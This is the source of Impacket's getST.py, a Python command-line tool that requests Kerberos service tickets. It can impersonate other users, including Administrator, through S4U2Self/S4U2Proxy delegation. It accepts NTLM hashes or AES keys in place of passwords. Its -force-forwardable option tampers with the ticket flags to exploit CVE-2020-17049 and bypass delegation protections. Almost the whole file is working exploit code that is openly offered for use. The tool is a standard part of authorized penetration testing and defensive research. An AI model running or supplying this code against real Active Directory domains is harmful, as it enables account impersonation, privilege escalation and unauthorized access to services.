#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2022 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Given a password, hash, aesKey or TGT in ccache, it will request a Service Ticket and save it as ccache
#   If the account has constrained delegation (with protocol transition) privileges you will be able to use
#   the -impersonate switch to request the ticket on behalf other user (it will use S4U2Self/S4U2Proxy to
#   request the ticket.)
#
#   Similar feature has been implemented already by Benjamin Delphi (@gentilkiwi) in Kekeo (s4u)
#
#   Examples:
#       ./getST.py -hashes lm:nt -spn cifs/contoso-dc contoso.com/user
#   or
#   If you have tickets cached (run klist to verify) the script will use them
#         ./getST.py -k -spn cifs/contoso-dc contoso.com/user
#   Be sure tho, that the cached TGT has the forwardable flag set (klist -f). getTGT.py will ask forwardable tickets
#   by default.
#
#   Also, if the account is configured with constrained delegation (with protocol transition) you can request
#   service tickets for other users, assuming the target SPN is allowed for delegation:
#         ./getST.py -k -impersonate Administrator -spn cifs/contoso-dc contoso.com/user
#
#   The output of this script will be a service ticket for the Administrator user.
#
#   Once you have the ccache file, set it in the KRB5CCNAME variable and use it for fun and profit.
#
# Author:
#   Alberto Solino (@agsolino)
#

from __future__ import division
from __future__ import print_function
import argparse
import datetime
import logging
import os
import random
import struct
import sys
from binascii import hexlify, unhexlify
from six import b

from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_credentials
from impacket.krb5 import constants
from impacket.krb5.asn1 import AP_REQ, AS_REP, TGS_REQ, Authenticator, TGS_REP, seq_set, seq_set_iter, PA_FOR_USER_ENC, \
    Ticket as TicketAsn1, EncTGSRepPart, PA_PAC_OPTIONS, EncTicketPart
from impacket.krb5.ccache import CCache
from impacket.krb5.crypto import Key, _enctype_table, _HMACMD5, _AES256CTS, Enctype
from impacket.krb5.constants import TicketFlags, encodeFlags
from impacket.krb5.kerberosv5 import getKerberosTGS, getKerberosTGT, sendReceive
from impacket.krb5.types import Principal, KerberosTime, Ticket
from impacket.ntlm import compute_nthash
from impacket.winregistry import hexdump


class GETST:
    def __init__(self, target, password, domain, options):
        self.__password = password
        self.__user = target
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = options.aesKey
        self.__options = options
        self.__kdcHost = options.dc_ip
        self.__force_forwardable = options.force_forwardable
        self.__additional_ticket = options.additional_ticket
        self.__saveFileName = None
        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')

    def saveTicket(self, ticket, sessionKey):
        logging.info('Saving ticket in %s' % (self.__saveFileName + '.ccache'))
        ccache = CCache()

        ccache.fromTGS(ticket, sessionKey, sessionKey)
        ccache.saveFile(self.__saveFileName + '.ccache')

    def doS4U2ProxyWithAdditionalTicket(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost, additional_ticket_path):
        if not os.path.isfile(additional_ticket_path):
            logging.error("Ticket %s doesn't exist" % additional_ticket_path)
            exit(0)
        else:
            decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
            logging.info("\tUsing additional ticket %s instead of S4U2Self" % additional_ticket_path)
            ccache = CCache.loadFile(additional_ticket_path)
            principal = ccache.credentials[0].header['server'].prettyPrint()
            creds = ccache.getCredential(principal.decode())
            TGS = creds.toTGS(principal)

            tgs = decoder.decode(TGS['KDC_REP'], asn1Spec=TGS_REP())[0]

            if logging.getLogger().level == logging.DEBUG:
                logging.debug('TGS_REP')
                print(tgs.prettyPrint())

            if self.__force_forwardable:
                # Convert hashes to binary form, just in case we're receiving strings
                if isinstance(nthash, str):
                    try:
                        nthash = unhexlify(nthash)
                    except TypeError:
                        pass
                if isinstance(aesKey, str):
                    try:
                        aesKey = unhexlify(aesKey)
                    except TypeError:
                        pass

                # Compute NTHash and AESKey if they're not provided in arguments
                if self.__password != '' and self.__domain != '' and self.__user != '':
                    if not nthash:
                        nthash = compute_nthash(self.__password)
                        if logging.getLogger().level == logging.DEBUG:
                            logging.debug('NTHash')
                            print(hexlify(nthash).decode())
                    if not aesKey:
                        salt = self.__domain.upper() + self.__user
                        aesKey = _AES256CTS.string_to_key(self.__password, salt, params=None).contents
                        if logging.getLogger().level == logging.DEBUG:
                            logging.debug('AESKey')
                            print(hexlify(aesKey).decode())

                # Get the encrypted ticket returned in the TGS. It's encrypted with one of our keys
                cipherText = tgs['ticket']['enc-part']['cipher']

                # Check which cipher was used to encrypt the ticket. It's not always the same
                # This determines which of our keys we should use for decryption/re-encryption
                newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]
                if newCipher.enctype == Enctype.RC4:
                    key = Key(newCipher.enctype, nthash)
                else:
                    key = Key(newCipher.enctype, aesKey)

                # Decrypt and decode the ticket
                # Key Usage 2
                # AS-REP Ticket and TGS-REP Ticket (includes tgs session key or
                #  application session key), encrypted with the service key
                #  (section 5.4.2)
                plainText = newCipher.decrypt(key, 2, cipherText)
                encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]

                # Print the flags in the ticket before modification
                logging.debug('\tService ticket from S4U2self flags: ' + str(encTicketPart['flags']))
                logging.debug('\tService ticket from S4U2self is'
                              + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value] == 1) else ' not')
                              + ' forwardable')

                # Customize flags the forwardable flag is the only one that really matters
                logging.info('\tForcing the service ticket to be forwardable')
                # convert to string of bits
                flagBits = encTicketPart['flags'].asBinary()
                # Set the forwardable flag. Awkward binary string insertion
                flagBits = flagBits[:TicketFlags.forwardable.value] + '1' + flagBits[TicketFlags.forwardable.value + 1:]
                # Overwrite the value with the new bits
                encTicketPart['flags'] = encTicketPart['flags'].clone(value=flagBits)  # Update flags

                logging.debug('\tService ticket flags after modification: ' + str(encTicketPart['flags']))
                logging.debug('\tService ticket now is'
                              + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value] == 1) else ' not')
                              + ' forwardable')

                # Re-encode and re-encrypt the ticket
                # Again, Key Usage 2
                encodedEncTicketPart = encoder.encode(encTicketPart)
                cipherText = newCipher.encrypt(key, 2, encodedEncTicketPart, None)

                # put it back in the TGS
                tgs['ticket']['enc-part']['cipher'] = cipherText

            ################################################################################
            # Up until here was all the S4USelf stuff. Now let's start with S4U2Proxy
            # So here I have a ST for me.. I now want a ST for another service
            # Extract the ticket from the TGT
            ticketTGT = Ticket()
            ticketTGT.from_asn1(decodedTGT['ticket'])

            # Get the service ticket
            ticket = Ticket()
            ticket.from_asn1(tgs['ticket'])

            apReq = AP_REQ()
            apReq['pvno'] = 5
            apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

            opts = list()
            apReq['ap-options'] = constants.encodeFlags(opts)
            seq_set(apReq, 'ticket', ticketTGT.to_asn1)

            authenticator = Authenticator()
            authenticator['authenticator-vno'] = 5
            authenticator['crealm'] = str(decodedTGT['crealm'])

            clientName = Principal()
            clientName.from_asn1(decodedTGT, 'crealm', 'cname')

            seq_set(authenticator, 'cname', clientName.components_to_asn1)

            now = datetime.datetime.utcnow()
            authenticator['cusec'] = now.microsecond
            authenticator['ctime'] = KerberosTime.to_asn1(now)

            encodedAuthenticator = encoder.encode(authenticator)

            # Key Usage 7
            # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
            # TGS authenticator subkey), encrypted with the TGS session
            # key (Section 5.5.1)
            encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

            apReq['authenticator'] = noValue
            apReq['authenticator']['etype'] = cipher.enctype
            apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

            encodedApReq = encoder.encode(apReq)

            tgsReq = TGS_REQ()

            tgsReq['pvno'] = 5
            tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
            tgsReq['padata'] = noValue
            tgsReq['padata'][0] = noValue
            tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
            tgsReq['padata'][0]['padata-value'] = encodedApReq

            # Add resource-based constrained delegation support
            paPacOptions = PA_PAC_OPTIONS()
            paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,))

            tgsReq['padata'][1] = noValue
            tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value
            tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)

            reqBody = seq_set(tgsReq, 'req-body')

            opts = list()
            # This specified we're doing S4U
            opts.append(constants.KDCOptions.cname_in_addl_tkt.value)
            opts.append(constants.KDCOptions.canonicalize.value)
            opts.append(constants.KDCOptions.forwardable.value)
            opts.append(constants.KDCOptions.renewable.value)

            reqBody['kdc-options'] = constants.encodeFlags(opts)
            service2 = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
            seq_set(reqBody, 'sname', service2.components_to_asn1)
            reqBody['realm'] = self.__domain

            myTicket = ticket.to_asn1(TicketAsn1())
            seq_set_iter(reqBody, 'additional-tickets', (myTicket,))

            now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

            reqBody['till'] = KerberosTime.to_asn1(now)
            reqBody['nonce'] = random.getrandbits(31)
            seq_set_iter(reqBody, 'etype',
                         (
                             int(constants.EncryptionTypes.rc4_hmac.value),
                             int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
                             int(constants.EncryptionTypes.des_cbc_md5.value),
                             int(cipher.enctype)
                         )
                         )
            message = encoder.encode(tgsReq)

            logging.info('\tRequesting S4U2Proxy')
            r = sendReceive(message, self.__domain, kdcHost)

            tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]

            cipherText = tgs['enc-part']['cipher']

            # Key Usage 8
            # TGS-REP encrypted part (includes application session
            # key), encrypted with the TGS session key (Section 5.4.2)
            plainText = cipher.decrypt(sessionKey, 8, cipherText)

            encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]

            newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])

            # Creating new cipher based on received keytype
            cipher = _enctype_table[encTGSRepPart['key']['keytype']]

            return r, cipher, sessionKey, newSessionKey

    def doS4U(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost):
        decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
        # Extract the ticket from the TGT
        ticket = Ticket()
        ticket.from_asn1(decodedTGT['ticket'])

        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = list()
        apReq['ap-options'] = constants.encodeFlags(opts)
        seq_set(apReq, 'ticket', ticket.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = str(decodedTGT['crealm'])

        clientName = Principal()
        clientName.from_asn1(decodedTGT, 'crealm', 'cname')

        seq_set(authenticator, 'cname', clientName.components_to_asn1)

        now = datetime.datetime.utcnow()
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('AUTHENTICATOR')
            print(authenticator.prettyPrint())
            print('\n')

        encodedAuthenticator = encoder.encode(authenticator)

        # Key Usage 7
        # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
        # TGS authenticator subkey), encrypted with the TGS session
        # key (Section 5.5.1)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        encodedApReq = encoder.encode(apReq)

        tgsReq = TGS_REQ()

        tgsReq['pvno'] = 5
        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)

        tgsReq['padata'] = noValue
        tgsReq['padata'][0] = noValue
        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgsReq['padata'][0]['padata-value'] = encodedApReq

        # In the S4U2self KRB_TGS_REQ/KRB_TGS_REP protocol extension, a service
        # requests a service ticket to itself on behalf of a user. The user is
        # identified to the KDC by the user's name and realm.
        clientName = Principal(self.__options.impersonate, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        S4UByteArray = struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)
        S4UByteArray += b(self.__options.impersonate) + b(self.__domain) + b'Kerberos'

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('S4UByteArray')
            hexdump(S4UByteArray)

        # Finally cksum is computed by calling the KERB_CHECKSUM_HMAC_MD5 hash
        # with the following three parameters: the session key of the TGT of
        # the service performing the S4U2Self request, the message type value
        # of 17, and the byte array S4UByteArray.
        checkSum = _HMACMD5.checksum(sessionKey, 17, S4UByteArray)

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('CheckSum')
            hexdump(checkSum)

        paForUserEnc = PA_FOR_USER_ENC()
        seq_set(paForUserEnc, 'userName', clientName.components_to_asn1)
        paForUserEnc['userRealm'] = self.__domain
        paForUserEnc['cksum'] = noValue
        paForUserEnc['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)
        paForUserEnc['cksum']['checksum'] = checkSum
        paForUserEnc['auth-package'] = 'Kerberos'

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('PA_FOR_USER_ENC')
            print(paForUserEnc.prettyPrint())

        encodedPaForUserEnc = encoder.encode(paForUserEnc)

        tgsReq['padata'][1] = noValue
        tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)
        tgsReq['padata'][1]['padata-value'] = encodedPaForUserEnc

        reqBody = seq_set(tgsReq, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.canonicalize.value)

        reqBody['kdc-options'] = constants.encodeFlags(opts)

        serverName = Principal(self.__user, type=constants.PrincipalNameType.NT_UNKNOWN.value)

        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        reqBody['realm'] = str(decodedTGT['crealm'])

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)
        seq_set_iter(reqBody, 'etype',
                     (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('Final TGS')
            print(tgsReq.prettyPrint())

        logging.info('\tRequesting S4U2self')
        message = encoder.encode(tgsReq)

        r = sendReceive(message, self.__domain, kdcHost)

        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('TGS_REP')
            print(tgs.prettyPrint())

        if self.__force_forwardable:
            # Convert hashes to binary form, just in case we're receiving strings
            if isinstance(nthash, str):
                try:
                    nthash = unhexlify(nthash)
                except TypeError:
                    pass
            if isinstance(aesKey, str):
                try:
                    aesKey = unhexlify(aesKey)
                except TypeError:
                    pass

            # Compute NTHash and AESKey if they're not provided in arguments
            if self.__password != '' and self.__domain != '' and self.__user != '':
                if not nthash:
                    nthash = compute_nthash(self.__password)
                    if logging.getLogger().level == logging.DEBUG:
                        logging.debug('NTHash')
                        print(hexlify(nthash).decode())
                if not aesKey:
                    salt = self.__domain.upper() + self.__user
                    aesKey = _AES256CTS.string_to_key(self.__password, salt, params=None).contents
                    if logging.getLogger().level == logging.DEBUG:
                        logging.debug('AESKey')
                        print(hexlify(aesKey).decode())

            # Get the encrypted ticket returned in the TGS. It's encrypted with one of our keys
            cipherText = tgs['ticket']['enc-part']['cipher']

            # Check which cipher was used to encrypt the ticket. It's not always the same
            # This determines which of our keys we should use for decryption/re-encryption
            newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]
            if newCipher.enctype == Enctype.RC4:
                key = Key(newCipher.enctype, nthash)
            else:
                key = Key(newCipher.enctype, aesKey)

            # Decrypt and decode the ticket
            # Key Usage 2
            # AS-REP Ticket and TGS-REP Ticket (includes tgs session key or
            #  application session key), encrypted with the service key
            #  (section 5.4.2)
            plainText = newCipher.decrypt(key, 2, cipherText)
            encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]

            # Print the flags in the ticket before modification
            logging.debug('\tService ticket from S4U2self flags: ' + str(encTicketPart['flags']))
            logging.debug('\tService ticket from S4U2self is'
                          + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value] == 1) else ' not')
                          + ' forwardable')

            # Customize flags the forwardable flag is the only one that really matters
            logging.info('\tForcing the service ticket to be forwardable')
            # convert to string of bits
            flagBits = encTicketPart['flags'].asBinary()
            # Set the forwardable flag. Awkward binary string insertion
            flagBits = flagBits[:TicketFlags.forwardable.value] + '1' + flagBits[TicketFlags.forwardable.value + 1:]
            # Overwrite the value with the new bits
            encTicketPart['flags'] = encTicketPart['flags'].clone(value=flagBits)  # Update flags

            logging.debug('\tService ticket flags after modification: ' + str(encTicketPart['flags']))
            logging.debug('\tService ticket now is'
                          + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value] == 1) else ' not')
                          + ' forwardable')

            # Re-encode and re-encrypt the ticket
            # Again, Key Usage 2
            encodedEncTicketPart = encoder.encode(encTicketPart)
            cipherText = newCipher.encrypt(key, 2, encodedEncTicketPart, None)

            # put it back in the TGS
            tgs['ticket']['enc-part']['cipher'] = cipherText

        ################################################################################
        # Up until here was all the S4USelf stuff. Now let's start with S4U2Proxy
        # So here I have a ST for me.. I now want a ST for another service
        # Extract the ticket from the TGT
        ticketTGT = Ticket()
        ticketTGT.from_asn1(decodedTGT['ticket'])

        # Get the service ticket
        ticket = Ticket()
        ticket.from_asn1(tgs['ticket'])

        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = list()
        apReq['ap-options'] = constants.encodeFlags(opts)
        seq_set(apReq, 'ticket', ticketTGT.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = str(decodedTGT['crealm'])

        clientName = Principal()
        clientName.from_asn1(decodedTGT, 'crealm', 'cname')

        seq_set(authenticator, 'cname', clientName.components_to_asn1)

        now = datetime.datetime.utcnow()
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        encodedAuthenticator = encoder.encode(authenticator)

        # Key Usage 7
        # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
        # TGS authenticator subkey), encrypted with the TGS session
        # key (Section 5.5.1)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        encodedApReq = encoder.encode(apReq)

        tgsReq = TGS_REQ()

        tgsReq['pvno'] = 5
        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
        tgsReq['padata'] = noValue
        tgsReq['padata'][0] = noValue
        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgsReq['padata'][0]['padata-value'] = encodedApReq

        # Add resource-based constrained delegation support
        paPacOptions = PA_PAC_OPTIONS()
        paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,))

        tgsReq['padata'][1] = noValue
        tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value
        tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)

        reqBody = seq_set(tgsReq, 'req-body')

        opts = list()
        # This specified we're doing S4U
        opts.append(constants.KDCOptions.cname_in_addl_tkt.value)
        opts.append(constants.KDCOptions.canonicalize.value)
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)

        reqBody['kdc-options'] = constants.encodeFlags(opts)
        service2 = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
        seq_set(reqBody, 'sname', service2.components_to_asn1)
        reqBody['realm'] = self.__domain

        myTicket = ticket.to_asn1(TicketAsn1())
        seq_set_iter(reqBody, 'additional-tickets', (myTicket,))

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)
        seq_set_iter(reqBody, 'etype',
                     (
                         int(constants.EncryptionTypes.rc4_hmac.value),
                         int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
                         int(constants.EncryptionTypes.des_cbc_md5.value),
                         int(cipher.enctype)
                     )
                     )
        message = encoder.encode(tgsReq)

        logging.info('\tRequesting S4U2Proxy')
        r = sendReceive(message, self.__domain, kdcHost)

        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]

        cipherText = tgs['enc-part']['cipher']

        # Key Usage 8
        # TGS-REP encrypted part (includes application session
        # key), encrypted with the TGS session key (Section 5.4.2)
        plainText = cipher.decrypt(sessionKey, 8, cipherText)

        encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]

        newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])

        # Creating new cipher based on received keytype
        cipher = _enctype_table[encTGSRepPart['key']['keytype']]

        return r, cipher, sessionKey, newSessionKey

    def run(self):
        tgt = None

        # Do we have a TGT cached?
        domain, _, TGT, _ = CCache.parseFile(self.__domain)

        # ToDo: Check this TGT belogns to the right principal
        if TGT is not None:
            tgt, cipher, sessionKey = TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey']
            oldSessionKey = sessionKey

        if tgt is None:
            # Still no TGT
            userName = Principal(self.__user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            logging.info('Getting TGT for user')
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                    unhexlify(self.__lmhash), unhexlify(self.__nthash),
                                                                    self.__aesKey,
                                                                    self.__kdcHost)

        # Ok, we have valid TGT, let's try to get a service ticket
        if self.__options.impersonate is None:
            # Normal TGS interaction
            logging.info('Getting ST for user')
            serverName = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, self.__kdcHost, tgt, cipher, sessionKey)
            self.__saveFileName = self.__user
        else:
            # Here's the rock'n'roll
            try:
                logging.info('Impersonating %s' % self.__options.impersonate)
                # Editing below to pass hashes for decryption
                if self.__additional_ticket is not None:
                    tgs, cipher, oldSessionKey, sessionKey = self.doS4U2ProxyWithAdditionalTicket(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey,
                                                                                                  self.__kdcHost, self.__additional_ticket)
                else:
                    tgs, cipher, oldSessionKey, sessionKey = self.doS4U(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey, self.__kdcHost)
            except Exception as e:
                logging.debug("Exception", exc_info=True)
                logging.error(str(e))
                if str(e).find('KDC_ERR_S_PRINCIPAL_UNKNOWN') >= 0:
                    logging.error('Probably user %s does not have constrained delegation permisions or impersonated user does not exist' % self.__user)
                if str(e).find('KDC_ERR_BADOPTION') >= 0:
                    logging.error('Probably SPN is not allowed to delegate by user %s or initial TGT not forwardable' % self.__user)

                return
            self.__saveFileName = self.__options.impersonate

        self.saveTicket(tgs, oldSessionKey)


if __name__ == '__main__':
    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help=True, description="Given a password, hash or aesKey, it will request a "
                                                                "Service Ticket and save it as ccache")
    parser.add_argument('identity', action='store', help='[domain/]username[:password]')
    parser.add_argument('-spn', action="store", required=True, help='SPN (service/server) of the target service the '
                                                                    'service ticket will' ' be generated for')
    parser.add_argument('-impersonate', action="store", help='target username that will be impersonated (thru S4U2Self)'
                                                             ' for quering the ST. Keep in mind this will only work if '
                                                             'the identity provided in this scripts is allowed for '
                                                             'delegation to the SPN specified')
    parser.add_argument('-additional-ticket', action='store', metavar='ticket.ccache', help='include a forwardable service ticket in a S4U2Proxy request for RBCD + KCD Kerberos only')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-force-forwardable', action='store_true', help='Force the service ticket obtained through '
                                                                        'S4U2Self to be forwardable. For best results, the -hashes and -aesKey values for the '
                                                                        'specified -identity should be provided. This allows impresonation of protected users '
                                                                        'and bypass of "Kerberos-only" constrained delegation restrictions. See CVE-2020-17049')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                                                       'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller. If '
                                                                            'ommited it use the domain part (FQDN) specified in the target parameter')

    if len(sys.argv) == 1:
        parser.print_help()
        print("\nExamples: ")
        print("\t./getST.py -spn cifs/contoso-dc -hashes lm:nt contoso.com/user\n")
        print("\tit will use the lm:nt hashes for authentication. If you don't specify them, a password will be asked")
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password = parse_credentials(options.identity)

    try:
        if domain is None:
            logging.critical('Domain should be specified!')
            sys.exit(1)

        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass

            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True

        executer = GETST(username, password, domain, options)
        executer.run()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback

            traceback.print_exc()
        print(str(e))
